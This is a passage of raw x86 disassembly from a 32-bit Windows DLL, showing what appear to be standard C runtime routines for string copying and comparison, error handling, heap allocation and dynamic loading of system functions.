100051f1:	68 98 dd 00 10       	push   $0x1000dd98
100051f6:	e8 df 2c 00 00       	call   0x10007eda
100051fb:	59                   	pop    %ecx
100051fc:	59                   	pop    %ecx
100051fd:	5d                   	pop    %ebp
100051fe:	c3                   	ret
100051ff:	8b ff                	mov    %edi,%edi
10005201:	55                   	push   %ebp
10005202:	8b ec                	mov    %esp,%ebp
10005204:	ff 75 08             	push   0x8(%ebp)
10005207:	e8 a4 15 00 00       	call   0x100067b0
1000520c:	59                   	pop    %ecx
1000520d:	b0 01                	mov    $0x1,%al
1000520f:	5d                   	pop    %ebp
10005210:	c3                   	ret
10005211:	6a 08                	push   $0x8
10005213:	68 f8 23 01 10       	push   $0x100123f8
10005218:	e8 83 d4 ff ff       	call   0x100026a0
1000521d:	e8 56 13 00 00       	call   0x10006578
10005222:	8b 70 0c             	mov    0xc(%eax),%esi
10005225:	85 f6                	test   %esi,%esi
10005227:	74 1e                	je     0x10005247
10005229:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000522d:	8b ce                	mov    %esi,%ecx
1000522f:	ff 15 5c d1 00 10    	call   *0x1000d15c
10005235:	ff d6                	call   *%esi
10005237:	eb 07                	jmp    0x10005240
10005239:	33 c0                	xor    %eax,%eax
1000523b:	40                   	inc    %eax
1000523c:	c3                   	ret
1000523d:	8b 65 e8             	mov    -0x18(%ebp),%esp
10005240:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
10005247:	e8 5b 00 00 00       	call   0x100052a7
1000524c:	cc                   	int3
1000524d:	8b ff                	mov    %edi,%edi
1000524f:	55                   	push   %ebp
10005250:	8b ec                	mov    %esp,%ebp
10005252:	8b 55 08             	mov    0x8(%ebp),%edx
10005255:	56                   	push   %esi
10005256:	85 d2                	test   %edx,%edx
10005258:	74 11                	je     0x1000526b
1000525a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000525d:	85 c9                	test   %ecx,%ecx
1000525f:	74 0a                	je     0x1000526b
10005261:	8b 75 10             	mov    0x10(%ebp),%esi
10005264:	85 f6                	test   %esi,%esi
10005266:	75 17                	jne    0x1000527f
10005268:	c6 02 00             	movb   $0x0,(%edx)
1000526b:	e8 a6 03 00 00       	call   0x10005616
10005270:	6a 16                	push   $0x16
10005272:	5e                   	pop    %esi
10005273:	89 30                	mov    %esi,(%eax)
10005275:	e8 df 02 00 00       	call   0x10005559
1000527a:	8b c6                	mov    %esi,%eax
1000527c:	5e                   	pop    %esi
1000527d:	5d                   	pop    %ebp
1000527e:	c3                   	ret
1000527f:	57                   	push   %edi
10005280:	8b fa                	mov    %edx,%edi
10005282:	2b f2                	sub    %edx,%esi
10005284:	8a 04 3e             	mov    (%esi,%edi,1),%al
10005287:	88 07                	mov    %al,(%edi)
10005289:	47                   	inc    %edi
1000528a:	84 c0                	test   %al,%al
1000528c:	74 05                	je     0x10005293
1000528e:	83 e9 01             	sub    $0x1,%ecx
10005291:	75 f1                	jne    0x10005284
10005293:	5f                   	pop    %edi
10005294:	85 c9                	test   %ecx,%ecx
10005296:	75 0b                	jne    0x100052a3
10005298:	88 0a                	mov    %cl,(%edx)
1000529a:	e8 77 03 00 00       	call   0x10005616
1000529f:	6a 22                	push   $0x22
100052a1:	eb cf                	jmp    0x10005272
100052a3:	33 f6                	xor    %esi,%esi
100052a5:	eb d3                	jmp    0x1000527a
100052a7:	e8 2d 2d 00 00       	call   0x10007fd9
100052ac:	85 c0                	test   %eax,%eax
100052ae:	74 08                	je     0x100052b8
100052b0:	6a 16                	push   $0x16
100052b2:	e8 70 2d 00 00       	call   0x10008027
100052b7:	59                   	pop    %ecx
100052b8:	f6 05 f0 30 01 10 02 	testb  $0x2,0x100130f0
100052bf:	74 22                	je     0x100052e3
100052c1:	6a 17                	push   $0x17
100052c3:	ff 15 64 d0 00 10    	call   *0x1000d064
100052c9:	85 c0                	test   %eax,%eax
100052cb:	74 05                	je     0x100052d2
100052cd:	6a 07                	push   $0x7
100052cf:	59                   	pop    %ecx
100052d0:	cd 29                	int    $0x29
100052d2:	6a 01                	push   $0x1
100052d4:	68 15 00 00 40       	push   $0x40000015
100052d9:	6a 03                	push   $0x3
100052db:	e8 cd 00 00 00       	call   0x100053ad
100052e0:	83 c4 0c             	add    $0xc,%esp
100052e3:	6a 03                	push   $0x3
100052e5:	e8 07 f7 ff ff       	call   0x100049f1
100052ea:	cc                   	int3
100052eb:	cc                   	int3
100052ec:	cc                   	int3
100052ed:	cc                   	int3
100052ee:	cc                   	int3
100052ef:	cc                   	int3
100052f0:	53                   	push   %ebx
100052f1:	56                   	push   %esi
100052f2:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
100052f6:	8b 54 24 10          	mov    0x10(%esp),%edx
100052fa:	8b 5c 24 14          	mov    0x14(%esp),%ebx
100052fe:	f7 c3 ff ff ff ff    	test   $0xffffffff,%ebx
10005304:	74 50                	je     0x10005356
10005306:	2b ca                	sub    %edx,%ecx
10005308:	f7 c2 03 00 00 00    	test   $0x3,%edx
1000530e:	74 17                	je     0x10005327
10005310:	0f b6 04 11          	movzbl (%ecx,%edx,1),%eax
10005314:	3a 02                	cmp    (%edx),%al
10005316:	75 48                	jne    0x10005360
10005318:	85 c0                	test   %eax,%eax
1000531a:	74 3a                	je     0x10005356
1000531c:	42                   	inc    %edx
1000531d:	83 eb 01             	sub    $0x1,%ebx
10005320:	76 34                	jbe    0x10005356
10005322:	f6 c2 03             	test   $0x3,%dl
10005325:	75 e9                	jne    0x10005310
10005327:	8d 04 11             	lea    (%ecx,%edx,1),%eax
1000532a:	25 ff 0f 00 00       	and    $0xfff,%eax
1000532f:	3d fc 0f 00 00       	cmp    $0xffc,%eax
10005334:	77 da                	ja     0x10005310
10005336:	8b 04 11             	mov    (%ecx,%edx,1),%eax
10005339:	3b 02                	cmp    (%edx),%eax
1000533b:	75 d3                	jne    0x10005310
1000533d:	83 eb 04             	sub    $0x4,%ebx
10005340:	76 14                	jbe    0x10005356
10005342:	8d b0 ff fe fe fe    	lea    -0x1010101(%eax),%esi
10005348:	83 c2 04             	add    $0x4,%edx
1000534b:	f7 d0                	not    %eax
1000534d:	23 c6                	and    %esi,%eax
1000534f:	a9 80 80 80 80       	test   $0x80808080,%eax
10005354:	74 d1                	je     0x10005327
10005356:	33 c0                	xor    %eax,%eax
10005358:	5e                   	pop    %esi
10005359:	5b                   	pop    %ebx
1000535a:	c3                   	ret
1000535b:	eb 03                	jmp    0x10005360
1000535d:	cc                   	int3
1000535e:	cc                   	int3
1000535f:	cc                   	int3
10005360:	1b c0                	sbb    %eax,%eax
10005362:	83 c8 01             	or     $0x1,%eax
10005365:	5e                   	pop    %esi
10005366:	5b                   	pop    %ebx
10005367:	c3                   	ret
10005368:	8b ff                	mov    %edi,%edi
1000536a:	55                   	push   %ebp
1000536b:	8b ec                	mov    %esp,%ebp
1000536d:	5d                   	pop    %ebp
1000536e:	e9 b6 02 00 00       	jmp    0x10005629
10005373:	8b ff                	mov    %edi,%edi
10005375:	55                   	push   %ebp
10005376:	8b ec                	mov    %esp,%ebp
10005378:	8b 45 10             	mov    0x10(%ebp),%eax
1000537b:	85 c0                	test   %eax,%eax
1000537d:	75 02                	jne    0x10005381
1000537f:	5d                   	pop    %ebp
10005380:	c3                   	ret
10005381:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10005384:	8b 55 08             	mov    0x8(%ebp),%edx
10005387:	56                   	push   %esi
10005388:	83 e8 01             	sub    $0x1,%eax
1000538b:	74 15                	je     0x100053a2
1000538d:	0f b7 32             	movzwl (%edx),%esi
10005390:	66 85 f6             	test   %si,%si
10005393:	74 0d                	je     0x100053a2
10005395:	66 3b 31             	cmp    (%ecx),%si
10005398:	75 08                	jne    0x100053a2
1000539a:	83 c2 02             	add    $0x2,%edx
1000539d:	83 c1 02             	add    $0x2,%ecx
100053a0:	eb e6                	jmp    0x10005388
100053a2:	0f b7 02             	movzwl (%edx),%eax
100053a5:	0f b7 09             	movzwl (%ecx),%ecx
100053a8:	2b c1                	sub    %ecx,%eax
100053aa:	5e                   	pop    %esi
100053ab:	5d                   	pop    %ebp
100053ac:	c3                   	ret
100053ad:	8b ff                	mov    %edi,%edi
100053af:	55                   	push   %ebp
100053b0:	8b ec                	mov    %esp,%ebp
100053b2:	81 ec 28 03 00 00    	sub    $0x328,%esp
100053b8:	a1 04 30 01 10       	mov    0x10013004,%eax
100053bd:	33 c5                	xor    %ebp,%eax
100053bf:	89 45 fc             	mov    %eax,-0x4(%ebp)
100053c2:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
100053c6:	57                   	push   %edi
100053c7:	74 09                	je     0x100053d2
100053c9:	ff 75 08             	push   0x8(%ebp)
100053cc:	e8 61 d2 ff ff       	call   0x10002632
100053d1:	59                   	pop    %ecx
100053d2:	6a 50                	push   $0x50
100053d4:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
100053da:	6a 00                	push   $0x0
100053dc:	50                   	push   %eax
100053dd:	e8 6e d9 ff ff       	call   0x10002d50
100053e2:	68 cc 02 00 00       	push   $0x2cc
100053e7:	8d 85 30 fd ff ff    	lea    -0x2d0(%ebp),%eax
100053ed:	6a 00                	push   $0x0
100053ef:	50                   	push   %eax
100053f0:	e8 5b d9 ff ff       	call   0x10002d50
100053f5:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
100053fb:	83 c4 18             	add    $0x18,%esp
100053fe:	89 85 d8 fc ff ff    	mov    %eax,-0x328(%ebp)
10005404:	8d 85 30 fd ff ff    	lea    -0x2d0(%ebp),%eax
1000540a:	89 85 dc fc ff ff    	mov    %eax,-0x324(%ebp)
10005410:	89 85 e0 fd ff ff    	mov    %eax,-0x220(%ebp)
10005416:	89 8d dc fd ff ff    	mov    %ecx,-0x224(%ebp)
1000541c:	89 95 d8 fd ff ff    	mov    %edx,-0x228(%ebp)
10005422:	89 9d d4 fd ff ff    	mov    %ebx,-0x22c(%ebp)
10005428:	89 b5 d0 fd ff ff    	mov    %esi,-0x230(%ebp)
1000542e:	89 bd cc fd ff ff    	mov    %edi,-0x234(%ebp)
10005434:	66 8c 95 f8 fd ff ff 	data16 mov %ss,-0x208(%ebp)
1000543b:	66 8c 8d ec fd ff ff 	data16 mov %cs,-0x214(%ebp)
10005442:	66 8c 9d c8 fd ff ff 	data16 mov %ds,-0x238(%ebp)
10005449:	66 8c 85 c4 fd ff ff 	data16 mov %es,-0x23c(%ebp)
10005450:	66 8c a5 c0 fd ff ff 	data16 mov %fs,-0x240(%ebp)
10005457:	66 8c ad bc fd ff ff 	data16 mov %gs,-0x244(%ebp)
1000545e:	9c                   	pushf
1000545f:	8f 85 f0 fd ff ff    	pop    -0x210(%ebp)
10005465:	8b 45 04             	mov    0x4(%ebp),%eax
10005468:	89 85 e8 fd ff ff    	mov    %eax,-0x218(%ebp)
1000546e:	8d 45 04             	lea    0x4(%ebp),%eax
10005471:	89 85 f4 fd ff ff    	mov    %eax,-0x20c(%ebp)
10005477:	c7 85 30 fd ff ff 01 	movl   $0x10001,-0x2d0(%ebp)
1000547e:	00 01 00 
10005481:	8b 40 fc             	mov    -0x4(%eax),%eax
10005484:	89 85 e4 fd ff ff    	mov    %eax,-0x21c(%ebp)
1000548a:	8b 45 0c             	mov    0xc(%ebp),%eax
1000548d:	89 85 e0 fc ff ff    	mov    %eax,-0x320(%ebp)
10005493:	8b 45 10             	mov    0x10(%ebp),%eax
10005496:	89 85 e4 fc ff ff    	mov    %eax,-0x31c(%ebp)
1000549c:	8b 45 04             	mov    0x4(%ebp),%eax
1000549f:	89 85 ec fc ff ff    	mov    %eax,-0x314(%ebp)
100054a5:	ff 15 7c d0 00 10    	call   *0x1000d07c
100054ab:	6a 00                	push   $0x0
100054ad:	8b f8                	mov    %eax,%edi
100054af:	ff 15 58 d0 00 10    	call   *0x1000d058
100054b5:	8d 85 d8 fc ff ff    	lea    -0x328(%ebp),%eax
100054bb:	50                   	push   %eax
100054bc:	ff 15 54 d0 00 10    	call   *0x1000d054
100054c2:	85 c0                	test   %eax,%eax
100054c4:	75 13                	jne    0x100054d9
100054c6:	85 ff                	test   %edi,%edi
100054c8:	75 0f                	jne    0x100054d9
100054ca:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
100054ce:	74 09                	je     0x100054d9
100054d0:	ff 75 08             	push   0x8(%ebp)
100054d3:	e8 5a d1 ff ff       	call   0x10002632
100054d8:	59                   	pop    %ecx
100054d9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
100054dc:	33 cd                	xor    %ebp,%ecx
100054de:	5f                   	pop    %edi
100054df:	e8 a5 c7 ff ff       	call   0x10001c89
100054e4:	c9                   	leave
100054e5:	c3                   	ret
100054e6:	8b ff                	mov    %edi,%edi
100054e8:	55                   	push   %ebp
100054e9:	8b ec                	mov    %esp,%ebp
100054eb:	8b 45 08             	mov    0x8(%ebp),%eax
100054ee:	a3 60 42 01 10       	mov    %eax,0x10014260
100054f3:	5d                   	pop    %ebp
100054f4:	c3                   	ret
100054f5:	8b ff                	mov    %edi,%edi
100054f7:	55                   	push   %ebp
100054f8:	8b ec                	mov    %esp,%ebp
100054fa:	56                   	push   %esi
100054fb:	e8 cf 11 00 00       	call   0x100066cf
10005500:	85 c0                	test   %eax,%eax
10005502:	74 29                	je     0x1000552d
10005504:	8b b0 5c 03 00 00    	mov    0x35c(%eax),%esi
1000550a:	85 f6                	test   %esi,%esi
1000550c:	74 1f                	je     0x1000552d
1000550e:	ff 75 18             	push   0x18(%ebp)
10005511:	ff 75 14             	push   0x14(%ebp)
10005514:	ff 75 10             	push   0x10(%ebp)
10005517:	ff 75 0c             	push   0xc(%ebp)
1000551a:	ff 75 08             	push   0x8(%ebp)
1000551d:	8b ce                	mov    %esi,%ecx
1000551f:	ff 15 5c d1 00 10    	call   *0x1000d15c
10005525:	ff d6                	call   *%esi
10005527:	83 c4 14             	add    $0x14,%esp
1000552a:	5e                   	pop    %esi
1000552b:	5d                   	pop    %ebp
1000552c:	c3                   	ret
1000552d:	ff 75 18             	push   0x18(%ebp)
10005530:	8b 35 04 30 01 10    	mov    0x10013004,%esi
10005536:	8b ce                	mov    %esi,%ecx
10005538:	ff 75 14             	push   0x14(%ebp)
1000553b:	33 35 60 42 01 10    	xor    0x10014260,%esi
10005541:	83 e1 1f             	and    $0x1f,%ecx
10005544:	ff 75 10             	push   0x10(%ebp)
10005547:	d3 ce                	ror    %cl,%esi
10005549:	ff 75 0c             	push   0xc(%ebp)
1000554c:	ff 75 08             	push   0x8(%ebp)
1000554f:	85 f6                	test   %esi,%esi
10005551:	75 ca                	jne    0x1000551d
10005553:	e8 11 00 00 00       	call   0x10005569
10005558:	cc                   	int3
10005559:	33 c0                	xor    %eax,%eax
1000555b:	50                   	push   %eax
1000555c:	50                   	push   %eax
1000555d:	50                   	push   %eax
1000555e:	50                   	push   %eax
1000555f:	50                   	push   %eax
10005560:	e8 90 ff ff ff       	call   0x100054f5
10005565:	83 c4 14             	add    $0x14,%esp
10005568:	c3                   	ret
10005569:	6a 17                	push   $0x17
1000556b:	ff 15 64 d0 00 10    	call   *0x1000d064
10005571:	85 c0                	test   %eax,%eax
10005573:	74 05                	je     0x1000557a
10005575:	6a 05                	push   $0x5
10005577:	59                   	pop    %ecx
10005578:	cd 29                	int    $0x29
1000557a:	56                   	push   %esi
1000557b:	6a 01                	push   $0x1
1000557d:	be 17 04 00 c0       	mov    $0xc0000417,%esi
10005582:	56                   	push   %esi
10005583:	6a 02                	push   $0x2
10005585:	e8 23 fe ff ff       	call   0x100053ad
1000558a:	83 c4 0c             	add    $0xc,%esp
1000558d:	56                   	push   %esi
1000558e:	ff 15 5c d0 00 10    	call   *0x1000d05c
10005594:	50                   	push   %eax
10005595:	ff 15 60 d0 00 10    	call   *0x1000d060
1000559b:	5e                   	pop    %esi
1000559c:	c3                   	ret
1000559d:	8b ff                	mov    %edi,%edi
1000559f:	55                   	push   %ebp
100055a0:	8b ec                	mov    %esp,%ebp
100055a2:	8b 4d 08             	mov    0x8(%ebp),%ecx
100055a5:	33 c0                	xor    %eax,%eax
100055a7:	3b 0c c5 18 de 00 10 	cmp    0x1000de18(,%eax,8),%ecx
100055ae:	74 27                	je     0x100055d7
100055b0:	40                   	inc    %eax
100055b1:	83 f8 2d             	cmp    $0x2d,%eax
100055b4:	72 f1                	jb     0x100055a7
100055b6:	8d 41 ed             	lea    -0x13(%ecx),%eax
100055b9:	83 f8 11             	cmp    $0x11,%eax
100055bc:	77 05                	ja     0x100055c3
100055be:	6a 0d                	push   $0xd
100055c0:	58                   	pop    %eax
100055c1:	5d                   	pop    %ebp
100055c2:	c3                   	ret
100055c3:	8d 81 44 ff ff ff    	lea    -0xbc(%ecx),%eax
100055c9:	6a 0e                	push   $0xe
100055cb:	59                   	pop    %ecx
100055cc:	3b c8                	cmp    %eax,%ecx
100055ce:	1b c0                	sbb    %eax,%eax
100055d0:	23 c1                	and    %ecx,%eax
100055d2:	83 c0 08             	add    $0x8,%eax
100055d5:	5d                   	pop    %ebp
100055d6:	c3                   	ret
100055d7:	8b 04 c5 1c de 00 10 	mov    0x1000de1c(,%eax,8),%eax
100055de:	5d                   	pop    %ebp
100055df:	c3                   	ret
100055e0:	8b ff                	mov    %edi,%edi
100055e2:	55                   	push   %ebp
100055e3:	8b ec                	mov    %esp,%ebp
100055e5:	56                   	push   %esi
100055e6:	e8 18 00 00 00       	call   0x10005603
100055eb:	8b 4d 08             	mov    0x8(%ebp),%ecx
100055ee:	51                   	push   %ecx
100055ef:	89 08                	mov    %ecx,(%eax)
100055f1:	e8 a7 ff ff ff       	call   0x1000559d
100055f6:	59                   	pop    %ecx
100055f7:	8b f0                	mov    %eax,%esi
100055f9:	e8 18 00 00 00       	call   0x10005616
100055fe:	89 30                	mov    %esi,(%eax)
10005600:	5e                   	pop    %esi
10005601:	5d                   	pop    %ebp
10005602:	c3                   	ret
10005603:	e8 c7 10 00 00       	call   0x100066cf
10005608:	85 c0                	test   %eax,%eax
1000560a:	75 06                	jne    0x10005612
1000560c:	b8 04 31 01 10       	mov    $0x10013104,%eax
10005611:	c3                   	ret
10005612:	83 c0 14             	add    $0x14,%eax
10005615:	c3                   	ret
10005616:	e8 b4 10 00 00       	call   0x100066cf
1000561b:	85 c0                	test   %eax,%eax
1000561d:	75 06                	jne    0x10005625
1000561f:	b8 00 31 01 10       	mov    $0x10013100,%eax
10005624:	c3                   	ret
10005625:	83 c0 10             	add    $0x10,%eax
10005628:	c3                   	ret
10005629:	8b ff                	mov    %edi,%edi
1000562b:	55                   	push   %ebp
1000562c:	8b ec                	mov    %esp,%ebp
1000562e:	56                   	push   %esi
1000562f:	8b 75 08             	mov    0x8(%ebp),%esi
10005632:	85 f6                	test   %esi,%esi
10005634:	74 0c                	je     0x10005642
10005636:	6a e0                	push   $0xffffffe0
10005638:	33 d2                	xor    %edx,%edx
1000563a:	58                   	pop    %eax
1000563b:	f7 f6                	div    %esi
1000563d:	3b 45 0c             	cmp    0xc(%ebp),%eax
10005640:	72 34                	jb     0x10005676
10005642:	0f af 75 0c          	imul   0xc(%ebp),%esi
10005646:	85 f6                	test   %esi,%esi
10005648:	75 17                	jne    0x10005661
1000564a:	46                   	inc    %esi
1000564b:	eb 14                	jmp    0x10005661
1000564d:	e8 4d 2c 00 00       	call   0x1000829f
10005652:	85 c0                	test   %eax,%eax
10005654:	74 20                	je     0x10005676
10005656:	56                   	push   %esi
10005657:	e8 00 ef ff ff       	call   0x1000455c
1000565c:	59                   	pop    %ecx
1000565d:	85 c0                	test   %eax,%eax
1000565f:	74 15                	je     0x10005676
10005661:	56                   	push   %esi
10005662:	6a 08                	push   $0x8
10005664:	ff 35 e0 46 01 10    	push   0x100146e0
1000566a:	ff 15 d0 d0 00 10    	call   *0x1000d0d0
10005670:	85 c0                	test   %eax,%eax
10005672:	74 d9                	je     0x1000564d
10005674:	eb 0d                	jmp    0x10005683
10005676:	e8 9b ff ff ff       	call   0x10005616
1000567b:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
10005681:	33 c0                	xor    %eax,%eax
10005683:	5e                   	pop    %esi
10005684:	5d                   	pop    %ebp
10005685:	c3                   	ret
10005686:	8b ff                	mov    %edi,%edi
10005688:	55                   	push   %ebp
10005689:	8b ec                	mov    %esp,%ebp
1000568b:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
1000568f:	74 2d                	je     0x100056be
10005691:	ff 75 08             	push   0x8(%ebp)
10005694:	6a 00                	push   $0x0
10005696:	ff 35 e0 46 01 10    	push   0x100146e0
1000569c:	ff 15 d4 d0 00 10    	call   *0x1000d0d4
100056a2:	85 c0                	test   %eax,%eax
100056a4:	75 18                	jne    0x100056be
100056a6:	56                   	push   %esi
100056a7:	e8 6a ff ff ff       	call   0x10005616
100056ac:	8b f0                	mov    %eax,%esi
100056ae:	ff 15 40 d0 00 10    	call   *0x1000d040
100056b4:	50                   	push   %eax
100056b5:	e8 e3 fe ff ff       	call   0x1000559d
100056ba:	59                   	pop    %ecx
100056bb:	89 06                	mov    %eax,(%esi)
100056bd:	5e                   	pop    %esi
100056be:	5d                   	pop    %ebp
100056bf:	c3                   	ret
100056c0:	68 fc e3 00 10       	push   $0x1000e3fc
100056c5:	68 f8 e3 00 10       	push   $0x1000e3f8
100056ca:	68 fc e3 00 10       	push   $0x1000e3fc
100056cf:	6a 00                	push   $0x0
100056d1:	e8 ff 00 00 00       	call   0x100057d5
100056d6:	83 c4 10             	add    $0x10,%esp
100056d9:	c3                   	ret
100056da:	68 3c e4 00 10       	push   $0x1000e43c
100056df:	68 34 e4 00 10       	push   $0x1000e434
100056e4:	68 3c e4 00 10       	push   $0x1000e43c
100056e9:	6a 14                	push   $0x14
100056eb:	e8 e5 00 00 00       	call   0x100057d5
100056f0:	83 c4 10             	add    $0x10,%esp
100056f3:	c3                   	ret
100056f4:	68 54 e4 00 10       	push   $0x1000e454
100056f9:	68 4c e4 00 10       	push   $0x1000e44c
100056fe:	68 54 e4 00 10       	push   $0x1000e454
10005703:	6a 16                	push   $0x16
10005705:	e8 cb 00 00 00       	call   0x100057d5
1000570a:	83 c4 10             	add    $0x10,%esp
1000570d:	c3                   	ret
1000570e:	8b ff                	mov    %edi,%edi
10005710:	55                   	push   %ebp
10005711:	8b ec                	mov    %esp,%ebp
10005713:	51                   	push   %ecx
10005714:	53                   	push   %ebx
10005715:	56                   	push   %esi
10005716:	57                   	push   %edi
10005717:	8b 7d 08             	mov    0x8(%ebp),%edi
1000571a:	e9 a2 00 00 00       	jmp    0x100057c1
1000571f:	8b 1f                	mov    (%edi),%ebx
10005721:	8d 04 9d 68 42 01 10 	lea    0x10014268(,%ebx,4),%eax
10005728:	8b 30                	mov    (%eax),%esi
1000572a:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000572d:	90                   	nop
1000572e:	85 f6                	test   %esi,%esi
10005730:	74 0b                	je     0x1000573d
10005732:	83 fe ff             	cmp    $0xffffffff,%esi
10005735:	0f 84 83 00 00 00    	je     0x100057be
1000573b:	eb 7d                	jmp    0x100057ba
1000573d:	8b 1c 9d 80 df 00 10 	mov    0x1000df80(,%ebx,4),%ebx
10005744:	68 00 08 00 00       	push   $0x800
10005749:	6a 00                	push   $0x0
1000574b:	53                   	push   %ebx
1000574c:	ff 15 c0 d0 00 10    	call   *0x1000d0c0
10005752:	8b f0                	mov    %eax,%esi
10005754:	85 f6                	test   %esi,%esi
10005756:	75 50                	jne    0x100057a8
10005758:	ff 15 40 d0 00 10    	call   *0x1000d040
1000575e:	83 f8 57             	cmp    $0x57,%eax
10005761:	75 35                	jne    0x10005798
10005763:	6a 07                	push   $0x7
10005765:	68 50 dc 00 10       	push   $0x1000dc50
1000576a:	53                   	push   %ebx
1000576b:	e8 03 fc ff ff       	call   0x10005373
10005770:	83 c4 0c             	add    $0xc,%esp
10005773:	85 c0                	test   %eax,%eax
10005775:	74 21                	je     0x10005798
10005777:	6a 07                	push   $0x7
10005779:	68 e8 e3 00 10       	push   $0x1000e3e8
1000577e:	53                   	push   %ebx
1000577f:	e8 ef fb ff ff       	call   0x10005373
10005784:	83 c4 0c             	add    $0xc,%esp
10005787:	85 c0                	test   %eax,%eax
10005789:	74 0d                	je     0x10005798
1000578b:	56                   	push   %esi
1000578c:	56                   	push   %esi
1000578d:	53                   	push   %ebx
1000578e:	ff 15 c0 d0 00 10    	call   *0x1000d0c0
10005794:	8b f0                	mov    %eax,%esi
10005796:	eb 02                	jmp    0x1000579a
10005798:	33 f6                	xor    %esi,%esi
1000579a:	85 f6                	test   %esi,%esi
1000579c:	75 0a                	jne    0x100057a8
1000579e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
100057a1:	83 c8 ff             	or     $0xffffffff,%eax
100057a4:	87 01                	xchg   %eax,(%ecx)
100057a6:	eb 16                	jmp    0x100057be
100057a8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
100057ab:	8b c6                	mov    %esi,%eax
100057ad:	87 01                	xchg   %eax,(%ecx)
100057af:	85 c0                	test   %eax,%eax
100057b1:	74 07                	je     0x100057ba
100057b3:	56                   	push   %esi
100057b4:	ff 15 b8 d0 00 10    	call   *0x1000d0b8
100057ba:	85 f6                	test   %esi,%esi
100057bc:	75 13                	jne    0x100057d1
100057be:	83 c7 04             	add    $0x4,%edi
100057c1:	3b 7d 0c             	cmp    0xc(%ebp),%edi
100057c4:	0f 85 55 ff ff ff    	jne    0x1000571f
100057ca:	33 c0                	xor    %eax,%eax
100057cc:	5f                   	pop    %edi
100057cd:	5e                   	pop    %esi
100057ce:	5b                   	pop    %ebx
100057cf:	c9                   	leave
100057d0:	c3                   	ret
100057d1:	8b c6                	mov    %esi,%eax
100057d3:	eb f7                	jmp    0x100057cc
100057d5:	8b ff                	mov    %edi,%edi
100057d7:	55                   	push   %ebp
100057d8:	8b ec                	mov    %esp,%ebp
100057da:	8b 45 08             	mov    0x8(%ebp),%eax
100057dd:	53                   	push   %ebx
100057de:	57                   	push   %edi
100057df:	8d 1c 85 b8 42 01 10 	lea    0x100142b8(,%eax,4),%ebx
100057e6:	8b 03                	mov    (%ebx),%eax
100057e8:	90                   	nop
100057e9:	8b 15 04 30 01 10    	mov    0x10013004,%edx
100057ef:	83 cf ff             	or     $0xffffffff,%edi
100057f2:	8b ca                	mov    %edx,%ecx
100057f4:	33 d0                	xor    %eax,%edx
100057f6:	83 e1 1f             	and    $0x1f,%ecx
100057f9:	d3 ca                	ror    %cl,%edx
100057fb:	3b d7                	cmp    %edi,%edx
100057fd:	75 04                	jne    0x10005803
100057ff:	33 c0                	xor    %eax,%eax
10005801:	eb 51                	jmp    0x10005854
10005803:	85 d2                	test   %edx,%edx
10005805:	74 04                	je     0x1000580b
10005807:	8b c2                	mov    %edx,%eax
10005809:	eb 49                	jmp    0x10005854
1000580b:	56                   	push   %esi
1000580c:	ff 75 14             	push   0x14(%ebp)
1000580f:	ff 75 10             	push   0x10(%ebp)
10005812:	e8 f7 fe ff ff       	call   0x1000570e
10005817:	59                   	pop    %ecx
10005818:	59                   	pop    %ecx
10005819:	85 c0                	test   %eax,%eax
1000581b:	74 1d                	je     0x1000583a
1000581d:	ff 75 0c             	push   0xc(%ebp)
10005820:	50                   	push   %eax
10005821:	ff 15 bc d0 00 10    	call   *0x1000d0bc
10005827:	8b f0                	mov    %eax,%esi
10005829:	85 f6                	test   %esi,%esi
1000582b:	74 0d                	je     0x1000583a
1000582d:	56                   	push   %esi
1000582e:	e8 2a f9 ff ff       	call   0x1000515d
10005833:	59                   	pop    %ecx
10005834:	87 03                	xchg   %eax,(%ebx)
10005836:	8b c6                	mov    %esi,%eax
10005838:	eb 19                	jmp    0x10005853
1000583a:	a1 04 30 01 10       	mov    0x10013004,%eax
1000583f:	6a 20                	push   $0x20
10005841:	83 e0 1f             	and    $0x1f,%eax
10005844:	59                   	pop    %ecx
10005845:	2b c8                	sub    %eax,%ecx
10005847:	d3 cf                	ror    %cl,%edi
10005849:	33 3d 04 30 01 10    	xor    0x10013004,%edi
1000584f:	87 3b                	xchg   %edi,(%ebx)
10005851:	33 c0                	xor    %eax,%eax
10005853:	5e                   	pop    %esi
10005854:	5f                   	pop    %edi
10005855:	5b                   	pop    %ebx
10005856:	5d                   	pop    %ebp
10005857:	c3                   	ret
10005858:	8b ff                	mov    %edi,%edi
1000585a:	55                   	push   %ebp
1000585b:	8b ec                	mov    %esp,%ebp
1000585d:	56                   	push   %esi
1000585e:	68 6c e4 00 10       	push   $0x1000e46c
10005863:	68 68 e4 00 10       	push   $0x1000e468
10005868:	68 6c e4 00 10       	push   $0x1000e46c
1000586d:	6a 1c                	push   $0x1c
1000586f:	e8 61 ff ff ff       	call   0x100057d5
10005874:	8b f0                	mov    %eax,%esi
10005876:	83 c4 10             	add    $0x10,%esp
10005879:	85 f6                	test   %esi,%esi
1000587b:	74 11                	je     0x1000588e
1000587d:	ff 75 08             	push   0x8(%ebp)
10005880:	8b ce                	mov    %esi,%ecx
10005882:	6a fa                	push   $0xfffffffa
10005884:	ff 15 5c d1 00 10    	call   *0x1000d15c
1000588a:	ff d6                	call   *%esi
1000588c:	eb 05                	jmp    0x10005893
1000588e:	b8 25 02 00 c0       	mov    $0xc0000225,%eax
10005893:	5e                   	pop    %esi
10005894:	5d                   	pop    %ebp
10005895:	c2 04 00             	ret    $0x4
10005898:	8b ff                	mov    %edi,%edi
1000589a:	56                   	push   %esi
1000589b:	e8 20 fe ff ff       	call   0x100056c0
100058a0:	8b f0                	mov    %eax,%esi
100058a2:	85 f6                	test   %esi,%esi
100058a4:	74 0c                	je     0x100058b2
100058a6:	8b ce                	mov    %esi,%ecx
